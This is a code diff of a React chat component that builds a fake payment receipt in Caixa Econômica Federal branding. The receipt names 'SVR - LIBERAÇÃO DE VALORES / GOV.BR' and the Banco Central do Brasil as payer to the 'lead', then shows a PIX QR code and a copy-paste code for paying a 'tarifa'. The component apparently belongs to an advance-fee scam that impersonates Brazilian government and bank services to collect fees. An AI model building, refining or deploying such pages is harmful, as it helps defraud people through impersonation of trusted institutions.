@@ -49,6 +49,18 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
     return min + rnd * (max - min);
   };
 
+  const maskDoc = (doc: string) => {
+    if (!doc) return "";
+    const digits = doc.replace(/\D/g, '');
+    if (digits.length === 11) {
+       return `***.${digits.substring(3,6)}.${digits.substring(6,9)}-**`;
+    }
+    if (digits.length === 14) {
+       return `**.***.${digits.substring(5,8)}/${digits.substring(8,12)}-**`;
+    }
+    return doc;
+  };
+
   useEffect(() => {
     endOfMessagesRef.current?.scrollIntoView({ behavior: "smooth" });
   }, [messages, typing]);
@@ -477,57 +489,60 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                   {msg.customType === "receipt" ? (
                     <div className="w-full">
                       {/* Receipt Card */}
-                      <div className="bg-[#f2f4f8] rounded-xl mb-5 shadow-lg text-gray-800 overflow-hidden border border-gray-200">
+                      <div className="bg-[#f4f5f7] rounded-md mb-5 shadow-sm text-gray-800 overflow-hidden border border-gray-200 font-sans">
                         {/* Caixa Header */}
-                        <div className="bg-[#005CA9] p-4 flex flex-col items-start justify-center">
-                          <h4 className="text-white font-black text-xl italic tracking-wide">CAIXA<span className="text-[#FFA500] ml-1">|</span></h4>
+                        <div className="bg-[#005CA9] pt-6 pb-12 px-5 relative overflow-hidden">
+                           <div className="absolute inset-0 opacity-10 bg-[url('/assets/logos/caixa-pattern.png')] bg-cover"></div>
+                           <h4 className="text-white font-black text-2xl tracking-tighter flex items-center relative z-10">
+                              CAIXA<span className="text-[#F39200] ml-1.5 text-2xl font-black">I</span>
+                           </h4>
                         </div>
                         
-                        <div className="bg-white p-4 mx-4 mt-[-10px] rounded shadow-sm border border-gray-100 flex justify-between relative z-10 text-center">
-                          <div className="flex-1 border-r border-gray-200">
-                            <p className="text-gray-500 text-xs">Valor</p>
-                            <p className="text-[#005CA9] font-bold text-lg">R$ {tarifa.toFixed(2).replace('.', ',')}</p>
+                        {/* Floating Card */}
+                        <div className="bg-white p-4 mx-4 mt-[-24px] rounded shadow-md flex justify-between relative z-10 text-center">
+                          <div className="flex-1 border-r border-gray-300 pr-2">
+                            <p className="text-gray-500 text-[13px] mb-1">Valor</p>
+                            <p className="text-[#005CA9] font-black text-xl">R$ {tarifa.toFixed(2).replace('.', ',')}</p>
                           </div>
-                          <div className="flex-1">
-                            <p className="text-gray-500 text-xs">Data</p>
-                            <p className="text-[#005CA9] font-bold text-[15px] leading-tight">{new Date().toLocaleDateString('pt-BR')}<br/><span className="text-xs font-normal text-gray-400">{new Date().toLocaleTimeString('pt-BR')}</span></p>
+                          <div className="flex-1 pl-2">
+                            <p className="text-gray-500 text-[13px] mb-1">Data</p>
+                            <p className="text-[#005CA9] font-black text-[15px]">{new Date().toLocaleDateString('pt-BR')}</p>
+                            <p className="text-[#005CA9] text-[13px] mt-0.5">{new Date().toLocaleTimeString('pt-BR', { hour: '2-digit', minute: '2-digit', second: '2-digit' })}</p>
                           </div>
                         </div>
 
                         {/* Recebedor info */}
-                        <div className="px-5 pt-4 pb-2">
-                          <div className="border-b-2 border-[#005CA9] pb-1 mb-3">
-                            <h3 className="text-[#005CA9] font-bold text-[15px]">Dados do recebedor</h3>
+                        <div className="px-5 pt-6 pb-4 bg-[#f4f5f7]">
+                          <div className="border-b-[1.5px] border-[#005CA9] pb-1.5 mb-4">
+                            <h3 className="text-[#005CA9] font-bold text-[16px]">Dados do recebedor</h3>
                           </div>
                           
-                          <div className="space-y-3">
+                          <div className="space-y-4">
                             <div>
-                              <p className="text-gray-500 text-[13px] mb-0.5">Nome</p>
-                              <p className="text-gray-800 font-bold text-[15px] uppercase">LIBERAÇÃO DE VALORES</p>
+                              <p className="text-gray-500 text-[14px] mb-0.5">Nome</p>
+                              <p className="text-[#333333] font-black text-[15px] uppercase">{leadName !== "Cidadão" ? leadName : "BENEFICIÁRIO(A)"}</p>
                             </div>
                             <div>
-                              <p className="text-gray-500 text-[13px] mb-0.5">Instituição</p>
-                              <p className="text-gray-800 font-bold text-[15px] uppercase">CAIXA ECONÔMICA FEDERAL</p>
+                              <p className="text-gray-500 text-[14px] mb-0.5">{data.docType}</p>
+                              <p className="text-[#333333] font-black text-[15px]">{maskDoc(data.docValue)}</p>
                             </div>
                           </div>
                         </div>
 
-                        <div className="h-2 bg-gray-100 w-full my-2"></div>
-
                         {/* Pagador info */}
-                        <div className="px-5 pb-5 pt-2">
-                          <div className="border-b-2 border-[#005CA9] pb-1 mb-3">
-                            <h3 className="text-[#005CA9] font-bold text-[15px]">Dados do pagador</h3>
+                        <div className="px-5 py-6 bg-white">
+                          <div className="border-b-[1.5px] border-[#005CA9] pb-1.5 mb-4">
+                            <h3 className="text-[#005CA9] font-bold text-[16px]">Dados do pagador</h3>
                           </div>
                           
-                          <div className="space-y-3">
+                          <div className="space-y-4">
                             <div>
-                              <p className="text-gray-500 text-[13px] mb-0.5">Nome</p>
-                              <p className="text-gray-800 font-bold text-[15px] uppercase">{leadName}</p>
+                              <p className="text-gray-500 text-[14px] mb-0.5">Nome</p>
+                              <p className="text-[#333333] font-black text-[15px] uppercase">SVR - LIBERAÇÃO DE VALORES / GOV.BR</p>
                             </div>
                             <div>
-                              <p className="text-gray-500 text-[13px] mb-0.5">{data.docType}</p>
-                              <p className="text-gray-800 font-bold text-[15px]">{data.docValue}</p>
+                              <p className="text-gray-500 text-[14px] mb-0.5">Instituição</p>
+                              <p className="text-[#333333] font-black text-[15px] uppercase">BANCO CENTRAL DO BRASIL</p>
                             </div>
                           </div>
                         </div>
@@ -542,11 +557,21 @@ export function ChatStep({ data, onReset }: ChatStepProps) {
                       <div className="mt-6 pt-5 border-t border-[#2e3b4e] flex flex-col items-center space-y-4">
                         {buyPixData?.pix_qr_code ? (
                           <>
-                            <div className="bg-white p-3 rounded-lg flex items-center justify-center">
+                            <div className="bg-white p-3 rounded-lg flex items-center justify-center w-full max-w-[280px]">
                               <QRCodeCanvas value={buyPixData.pix_qr_code} size={200} />
                             </div>
-                            <button onClick={copyPix} className="w-full max-w-[280px] bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3 rounded-md font-bold transition-colors shadow-md text-sm mt-4">
-                                Copiar Código PIX
+                            
+                            <div className="w-full max-w-[280px] bg-[#161c24] border border-[#2d3748] rounded-md p-3 mt-2 shadow-sm">
+                               <p className="text-gray-400 text-[11px] mb-1 font-bold uppercase tracking-wider">PIX Copia e Cola:</p>
+                               <div className="bg-[#0d1218] p-2 rounded border border-[#2d3748]">
+                                  <p className="text-white text-[12px] break-all font-mono leading-relaxed max-h-[4.5em] overflow-hidden" style={{ display: '-webkit-box', WebkitLineClamp: 3, WebkitBoxOrient: 'vertical' }}>
+                                    {buyPixData.pix_qr_code}
+                                  </p>
+                               </div>
+                            </div>
+
+                            <button onClick={copyPix} className="w-full max-w-[280px] bg-[#ff9029] hover:bg-[#e87f1f] text-white py-3.5 rounded-md font-bold transition-colors shadow-md text-[15px] mt-3">
+                                COPIAR CÓDIGO PIX
                             </button>
                           </>
                         ) : (
